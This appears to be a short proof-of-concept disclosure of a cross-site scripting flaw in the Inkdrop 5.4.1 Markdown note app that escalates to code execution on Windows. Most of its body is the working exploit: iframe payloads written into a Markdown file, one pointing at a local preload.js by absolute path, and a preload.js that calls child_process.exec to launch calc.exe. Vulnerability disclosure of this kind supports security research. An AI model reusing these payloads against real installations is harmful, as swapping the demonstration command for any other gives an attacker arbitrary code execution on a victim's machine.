# inkdrop XSS to RCE Poc

**Product Presentation:**

Solely designed for Markdown to improve your dev workflow.
Get a low-friction personal note-taking workflow and accomplish more. With your notes well-organized effortlessly, you can stay focused on doing your best work.

**Product Website:**
https://www.inkdrop.app/

**Product download Address:**
https://d3ip0rje8grhnl.cloudfront.net/v5.4.1/Inkdrop-demo-5.4.1-Windows.zip

**Version:**
5.4.1

**Payload:**
write payload into markdown file,'preload.js' need absolute address to introduce.

```
<iframe src=javascript:alert('xss')></iframe>
<iframe src=1 preload="C:\Users\root\Downloads\Inkdrop-demo-5.4.1-Windows\resources\app\preload.js"></iframe> # absolute path
```

preload.js:
```
require('child_process').exec('calc.exe')
```

[POC video](https://www.youtube.com/watch?v=w-2ueZzCQ8E)
